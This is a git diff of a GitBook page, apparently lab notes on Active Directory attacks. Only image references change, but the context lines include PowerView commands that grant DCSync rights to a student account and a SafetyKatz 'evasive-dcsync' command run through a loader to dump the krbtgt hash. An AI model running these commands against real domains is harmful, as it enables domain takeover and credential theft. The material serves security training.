@@ -51,7 +51,7 @@ C:\AD\Tools\InviShell\RunWithPathAsAdmin.bat
 Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student113 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
 ```
 
-<figure><img src="../../../.gitbook/assets/image (566).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1438).png" alt=""><figcaption></figcaption></figure>
 
 #### Chech again
 
@@ -65,7 +65,7 @@ Get-DomainObjectAcl -SearchBase "DC=dollarcorp,DC=moneycorp,DC=local" -SearchSco
 
 > Remeber change the student113
 
-<figure><img src="../../../.gitbook/assets/image (567).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1439).png" alt=""><figcaption></figcaption></figure>
 
 Sweet! Now, below command (or any similar tool) can be used as `studentx` to get the hashes of `krbtgt` user or any other user:
 
@@ -73,7 +73,7 @@ Sweet! Now, below command (or any similar tool) can be used as `studentx` to get
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
 ```
 
-<figure><img src="../../../.gitbook/assets/image (568).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (1440).png" alt=""><figcaption></figcaption></figure>
 
 ***
 
